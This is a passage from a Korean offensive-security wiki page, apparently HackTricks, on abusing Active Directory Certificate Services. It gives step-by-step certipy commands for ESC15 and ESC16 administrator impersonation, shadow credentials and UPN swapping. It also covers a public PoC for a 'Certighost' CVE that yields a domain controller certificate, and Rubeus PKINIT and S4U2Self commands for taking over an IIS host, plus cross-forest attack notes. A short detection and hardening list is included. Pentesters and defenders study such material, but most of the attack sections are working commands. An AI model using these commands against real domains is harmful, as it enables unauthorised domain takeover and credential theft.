- `-application-policies 'Client Authentication'`: CSR의 Application Policies 확장에 OID `1.3.6.1.5.5.7.3.2`를 삽입합니다.
- `-upn 'administrator@corp.local'`: 사칭에 사용할 UPN을 SAN에 설정합니다.

**2단계: 획득한 인증서를 사용해 Schannel(LDAPS)로 인증합니다.**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```

#### 시나리오 B: Enrollment Agent 악용을 통한 PKINIT/Kerberos Impersonation

**1단계: "Enrollee supplies subject"가 설정된 V1 템플릿에서 "Certificate Request Agent" Application Policy를 삽입해 인증서를 요청합니다.** 이 인증서는 공격자(`attacker@corp.local`)가 Enrollment Agent가 되기 위한 것입니다. 목적이 agent 권한을 얻는 것이므로, 여기서는 공격자 자신의 identity에 UPN을 지정하지 않습니다.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -application-policies 'Certificate Request Agent'
```

- `-application-policies 'Certificate Request Agent'`: OID `1.3.6.1.4.1.311.20.2.1`을 삽입합니다.

**Step 2: "agent" certificate를 사용해 대상 권한 사용자를 대신하여 certificate를 요청합니다.** 이 단계는 Step 1의 certificate를 agent certificate로 사용하는 ESC3와 유사한 단계입니다.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'User' \
    -pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```

**단계 3: "on-behalf-of" 인증서를 사용해 특권 사용자로 인증합니다.**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```

## Security Extension Disabled on CA (Globally)-ESC16

### 설명

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)**은 **szOID_NTDS_CA_SECURITY_EXT** SID extension이 CA 전체에서 억제된 상태를 설명합니다. 이는 구성 상태를 나타내는 지표일 뿐, 인증서가 다른 계정으로 인증할 수 있다는 증거는 아닙니다. 계정을 가장하려면 관련 계정 속성이나 mapping을 제어할 수 있어야 하고, 등록 가능한 client-authentication template이 있어야 하며, 실제 domain controller 또는 service에서 허용하는 certificate mapping 경로가 필요합니다. Full Enforcement 상태인 패치된 KDC는 다른 strong mapping이 없는 한 SID extension이 없는 인증서를 거부합니다. 아래의 UPN-only Kerberos 절차는 여전히 weak mapping을 허용하는 구형 또는 호환 모드 KDC에 적용됩니다. 자세한 내용은 [Microsoft의 certificate mapping 및 enforcement 지침](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers)을 참조하세요.

자세한 원리를 알아보려면 이 문서도 참조하세요:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### 악용

다음의 과거 UPN-only Kerberos 예시는 [Certipy의 ESC16 문서](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally)를 기반으로 합니다. 이 예시를 사용하려면 결과로 생성된 weak mapping을 여전히 허용하는 KDC가 필요합니다. `StrongCertificateBindingEnforcement=1`은 2025년 9월 9일 Windows 보안 업데이트 이후 더 이상 지원되는 우회 설정이 아닙니다.<sup>[[14]](#references)</sup>

Active Directory Certificate Services (AD CS) 환경이 **ESC16**에 취약한지 확인하려면

```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```

**1단계: 피해자 계정의 초기 UPN 읽기(선택 사항 - 복원용).**  


```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -user 'victim' \
    read
```

**2단계: 피해자 계정의 UPN을 대상 관리자 계정의 `sAMAccountName`으로 업데이트합니다.**  

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'administrator' \
    -user 'victim' update
```

**3단계: ("피해자" 계정의 자격 증명 획득(필요한 경우, 예: Shadow Credentials 사용).**

```shell
certipy shadow \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -account 'victim' \
    auto
```

**4단계: 계정이 등록할 수 있는 클라이언트 인증 템플릿(예: "User")을 사용해 ESC16으로 구성된 CA에서 "victim" 사용자로 인증서를 요청합니다.** CA는 발급된 인증서에서 SID 보안 확장을 생략하지만, 이것만으로 사용 가능한 인증 매핑이 설정되지는 않습니다. Kerberos 자격 증명 캐시 환경 변수를 설정합니다(셸 명령):

```bash
export KRB5CCNAME=victim.ccache
```

그런 다음 인증서를 요청합니다:

```bash
certipy req \
    -k -dc-ip '10.0.0.100' \
    -target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
    -template 'User'
```

**5단계: "victim" 계정의 UPN을 원래대로 되돌립니다.**

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'victim@corp.local' \
    -user 'victim' update
```

**6단계: 이 취약한 매핑을 허용하는 구형 또는 호환성 모드 KDC에서 대상 관리자 계정으로 인증합니다.**

```bash
certipy auth \
    -dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
    -username 'administrator' -domain 'corp.local'
```

## Rogue LDAP/LSA chase callback의 identity 대체 (Certighost / CVE-2026-54121)

### 설명

**Certighost**는 CA가 발급된 인증서에 넣을 identity를 확인할 때 요청자가 제공한 request attributes를 신뢰하는 **AD CS enrollment chase / callback 경로**를 악용합니다. 공개 PoC의 조작된 요청에는 다음이 포함됩니다:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: CA가 접속할 공격자 제어 호스트/IP
- **`rmd`**: 사칭할 **대상 Domain Controller의 DNS 이름**

CA가 해당 chase를 따르는 경우 **SMB/LSA (`445`)**와 **LDAP (`389`)**를 통해 공격자에게 연결합니다. 공격자는 **실제 machine account**(보통 기본 **`ms-DS-MachineAccountQuota`**를 통해 생성)를 사용하므로 callback 세션은 유효한 도메인 principal로 인증됩니다. 하지만 rogue 서비스는 대신 **대상 DC**의 identity attributes를 반환합니다.

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

CA가 반환된 identity를 인증된 callback principal에 **암호학적으로 바인딩하지 않으면**, 세션은 공격자가 제어하는 machine account로 인증되었더라도 **Domain Controller**용 인증서를 발급할 수 있습니다. 따라서 이 취약점은 개념적으로 **Certifried**와 다릅니다. 공격자는 `dNSHostName` 같은 AD attributes를 재작성하는 대신, **CA callback에서 identity를 확인하는 과정에 identity 데이터를 대체**합니다.<sup>[[2]](#references)</sup>

**유용한 사전 조건:**

- 낮은 권한의 **도메인 자격 증명**
- 컴퓨터 계정을 **생성하거나 재사용할 수 있는 권한**
- **CA**에서 공격자 제어 **포트 `389` 및 `445`**로 연결할 수 있는 네트워크 경로
- 취약하거나 패치되지 않은 CA request 경로 (**2026년 7월 14일** Microsoft 업데이트에서 **`cdc`에 대한 DC validation**과 **resolved-SID 비교**가 추가됨)

그 결과로 얻은 **`.pfx`**는 **PKINIT**에 사용할 수 있으며, 이를 통해 **`.ccache`**와 공개된 PoC 흐름에서는 **대상 DC의 NT hash**를 얻을 수 있습니다. 이는 일반적으로 **도메인 전체를 장악**하기에 충분합니다.

### 악용

공개 PoC는 전체 과정을 자동화합니다:<sup>[[1]](#references)</sup>

1. 공격자가 제어하는 **machine account**를 생성하거나 재사용합니다.
2. `389` 및 `445`에서 **rogue LDAP 및 SMB/LSA listener**를 실행합니다.
3. 공격자 제어 **`cdc`**와 대상 **`rmd`** attributes가 포함된 인증서 요청을 제출합니다.
4. CA가 제어 중인 machine account로 rogue listener에 인증하도록 한 뒤, identity 조회에 **대상 DC**의 attributes를 반환합니다.
5. CA가 서명한 **DC 인증서**를 받은 다음 **PKINIT**에 사용합니다.

```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```

Useful runtime flags from the PoC:

- `--listener <ip>`: `cdc`에 광고되는 callback IP를 명시적으로 선택
- `--computer-name <NAME$>`: 새 계정을 만들지 않고 기존 machine account 재사용

**운영 참고 사항:**

- PoC는 **privileged ports** `389` 및 `445`에 바인딩하므로 **root** 권한이 필요합니다.
- Exploitation에 성공하면 로컬에 **DC `.pfx`**와 **Kerberos `.ccache`**가 기록됩니다.
- 인증서가 **Domain Controller account**에 매핑되므로, 후속 작업으로 **certificate-based Kerberos auth**, **DCSync**, 복구한 **machine NT hash** 재사용 등이 가능합니다.<sup>[[2]](#references)</sup>

## IIS AppPool machine enrollment를 통한 동일 호스트의 Administrator 권한 획득

`ApplicationPoolIdentity`로 실행되는 IIS pool은 네트워크 리소스에 대한 outbound access에 호스트의 **computer account**를 사용합니다. 따라서 `IIS AppPool\<POOL>`로 code execution을 획득하면 로컬 token의 권한은 낮은 상태로 유지되지만, CA가 `HOST$`로 인증하는 AD CS request를 제출할 수 있습니다. 이는 outbound identity transition이며, token impersonation이나 Potato-style 로컬 권한 상승이 아닙니다.<sup>[[19]](#references)[[20]](#references)</sup>

이 chain에는 domain-joined IIS host, RPC를 통해 연결 가능한 Enterprise CA, computer에 enrollment 권한이 있는 published machine-authentication template, PKINIT 지원, KDC/SMB 연결성이 필요합니다. Custom pool identity를 사용하면 outbound principal이 달라지므로, `HOST$`를 전제로 하기 전에 pool이 실제로 `ApplicationPoolIdentity`를 사용하는지 확인하세요.<sup>[[19]](#references)[[20]](#references)</sup>

### Attacker-controlled-key enrollment

IIS server 외부에서 key pair와 CSR을 생성하고 private key를 보관합니다. 침해된 worker에서는 **CSR만** 제출합니다. [Certi-Bhai ASPX PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx)는 `CertificateAuthority.Request`를 인스턴스화하고, `CertificateTemplate:Machine`을 설정한 뒤, `ICertRequest::Submit`을 호출하여 발급된 인증서를 반환합니다. CA configuration string `CAHOST\CA-NAME`을 사용하세요. 일반적인 `Machine` template은 AD에서 subject를 구성하므로, requester가 제공하는 subject/SAN 데이터는 필요하지 않습니다.<sup>[[18]](#references)[[19]](#references)[[21]](#references)</sup>

반환된 인증서를 **보관해 둔 해당 private key**와 결합합니다. `certutil -MergePFX machine_cert.cer machine_cert.pfx`는 Windows가 인증서를 접근 가능한 private key와 이미 연결할 수 있는 경우에만 작동합니다. 별도의 PEM 파일을 사용하는 경우에는 PKCS#12를 명시적으로 생성하세요:<sup>[[19]](#references)[[23]](#references)</sup>

```bash
openssl pkcs12 -export -in machine_cert.cer -inkey machine_cert.key \
  -out machine_cert.pfx -name 'HOST$'
```

PKINIT에 PFX를 사용하고, 반환된 컴퓨터 TGT를 즉시 주입하는 대신 base64 형식으로 유지하세요:<sup>[[5]](#references)[[19]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:HOST$ /domain:DOMAIN /certificate:machine_cert.pfx `
  /password:PFX_PASSWORD /nowrap
```

### S4U2Self 및 동일 호스트 서비스 대체

S4U2Self를 사용하면 서비스가 다른 사용자의 권한 데이터가 포함된 티켓을 **자기 자신에게** 발급받을 수 있습니다. 컴퓨터 TGT를 사용해 Rubeus는 권한이 높은 사용자를 위한 티켓을 요청하고, 반환된 KRB-CRED의 서비스 이름을 CIFS로 바꾼 뒤 이를 주입할 수 있습니다. 이는 로컬의 “자기 자신에게 위임” 프리미티브로, S4U2Proxy나 `msDS-AllowedToDelegateTo` 항목이 필요하지 않습니다.<sup>[[5]](#references)[[17]](#references)[[22]](#references)</sup>

```powershell
Rubeus.exe s4u /self /impersonateuser:Administrator `
  /altservice:cifs/HOST.DOMAIN /ticket:BASE64_MACHINE_TGT /ptt /nowrap

klist
dir \\HOST.DOMAIN\C$
```

대체된 ticket은 **동일한 컴퓨터 계정/키**(여기서는 `HOST`의 CIFS)에서만 사용할 수 있습니다. 다른 도메인 컴퓨터에서 재사용할 수 있는 Administrator ticket은 아닙니다. 또한 시연된 결과는 Administrator 권한의 SMB/파일 시스템 액세스입니다. 로컬 `NT AUTHORITY\SYSTEM` 프로세스를 얻으려면 별도의 원격 실행 단계가 여전히 필요합니다.<sup>[[5]](#references)[[17]](#references)[[19]](#references)</sup>

### 탐지 및 강화

- CA에서 Certification Services 이벤트 **4886**(요청 수신)과 **4887**(발급)을 연관 분석하여 IIS 서버 계정의 예상치 못한 `Machine` 템플릿 요청을 탐지합니다.<sup>[[19]](#references)[[24]](#references)</sup>
- DC에서 인증서 사전 인증이 사용되면 이벤트 **4768**에 인증서 필드가 포함됩니다. 웹 서버 계정의 비정상적인 PKINIT TGT 요청에 경고를 설정합니다. 이어서 권한 있는 사칭 ID와 동일한 호스트가 관련된 **4769** 요청을 확인합니다. Rubeus `/altservice`는 클라이언트 측에서 KRB-CRED 서비스 이름을 다시 작성하므로, DC 측 4769 서비스 이름이 `cifs`일 것을 필수 조건으로 삼지 마세요.<sup>[[5]](#references)[[25]](#references)[[26]](#references)</sup>
- `w3wp.exe`의 CA RPC 엔드포인트 접속, 예상치 못한 ASPX 파일 생성, Kerberos 인증을 사용한 관리 공유 액세스, 비밀 정보 덤프 활동을 조사합니다. 가능한 경우 앱 계층의 CA RPC/KDC/SMB 액세스를 제한하고, 운영상 필요하지 않은 컴퓨터 등록 권한이나 머신 인증 템플릿을 제거합니다.<sup>[[19]](#references)</sup>

## 수동태로 설명하는 인증서를 이용한 포리스트 침해

### 침해된 CA를 통한 포리스트 트러스트 파괴

**포리스트 간 등록**을 위한 구성은 비교적 간단하게 이루어집니다. 리소스 포리스트의 **루트 CA 인증서**는 관리자가 **계정 포리스트에 게시**하고, 리소스 포리스트의 **엔터프라이즈 CA** 인증서는 각 계정 포리스트의 `NTAuthCertificates` 및 AIA 컨테이너에 **추가**합니다. 즉, 이 구성은 PKI를 관리하는 다른 모든 포리스트에 대해 리소스 포리스트의 **CA가 완전한 통제권을 갖도록 합니다**. 공격자가 이 CA를 **침해하면**, 리소스 포리스트와 계정 포리스트의 모든 사용자에 대한 인증서를 **위조할 수 있어** 포리스트의 보안 경계가 무너질 수 있습니다.<sup>[[6]](#references)</sup>

### 외부 주체에 부여된 등록 권한

다중 포리스트 환경에서는 **인증서 템플릿을 게시**하는 엔터프라이즈 CA에 주의해야 합니다. 특히 해당 템플릿이 **Authenticated Users 또는 외부 주체**(엔터프라이즈 CA가 속한 포리스트 외부의 사용자/그룹)에게 **등록 및 편집 권한**을 허용하는 경우 더욱 그렇습니다.\
트러스트를 통해 인증하면 AD가 **Authenticated Users SID**를 사용자의 토큰에 추가합니다. 따라서 도메인에 **Authenticated Users의 등록 권한을 허용하는** 템플릿이 있는 엔터프라이즈 CA가 있다면, 다른 포리스트의 사용자가 해당 템플릿에 **등록할 가능성이 있습니다**. 마찬가지로 템플릿에서 **외부 주체에 등록 권한을 명시적으로 부여하면**, **포리스트 간 액세스 제어 관계가 생성되어** 한 포리스트의 주체가 다른 포리스트의 템플릿에 **등록할 수 있게 됩니다**.

두 시나리오 모두 포리스트 간 **공격 표면을 확대합니다**. 공격자는 인증서 템플릿 설정을 악용해 외부 도메인에서 추가 권한을 얻을 수 있습니다.<sup>[[6]](#references)</sup>


## References

- [1] [aniqfakhrul/CVE-2026-54121 PoC 저장소](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - Certighost 기술 분석](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – SpecterOps 블로그](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned: Active Directory Certificate Services 악용](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9, ESC10, BloodHound GUI, 새로운 인증 및 요청 방식 등](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: Key Trust 계정 매핑을 악용한 계정 탈취](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – Enhanced Key (오)사용 이야기](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – RPC를 통한 AD Certificate Services 릴레이](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: YubiHSM을 통한 ADCS CA 셸 액세스](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – ADCS ESC13 악용 기법](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – ADCS ESC14 악용 기법](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – 권한 상승 (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: 또 하나의 AD CS ESC가 아닙니다](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: 잘못된 구성 및 악용](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
- [17] [Charlie Clark – “Delegate 2 Thyself” 다시 살펴보기](https://exploit.ph/revisiting-delegate-2-thyself.html)
- [18] [incredibleindishell/Certi-Bhai – IIS AD CS 등록 PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx)
- [19] [Mannu Linux – AD CS RPC 엔드포인트를 통한 IIS AppPool 권한 상승](https://mannulinux.org/2026/08/Privilege-escalation-from-IIS-AppPool-to-NT-AuthoritySYSTEM-via-AD-CS-RPC-endpoint.html)
- [20] [Microsoft – 애플리케이션 풀 ID](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)
- [21] [Microsoft – ICertRequest::Submit](https://learn.microsoft.com/en-us/windows/win32/api/certcli/nf-certcli-icertrequest-submit)
- [22] [Microsoft Open Specifications – S4U2self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13)
- [23] [OpenSSL – pkcs12 명령](https://docs.openssl.org/3.6/man1/openssl-pkcs12/)
- [24] [Microsoft – Certification Services 감사](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/audit-certification-services)
- [25] [Microsoft – 이벤트 4768: Kerberos 인증 ticket 요청](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [26] [Microsoft – 이벤트 4769: Kerberos 서비스 ticket 요청](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [27] [incredibleindishell/Certi-Bhai – AD CS PowerShell 악용 툴킷](https://github.com/incredibleindishell/Certi-Bhai)
{{#include ../../../banners/hacktricks-training.md}}
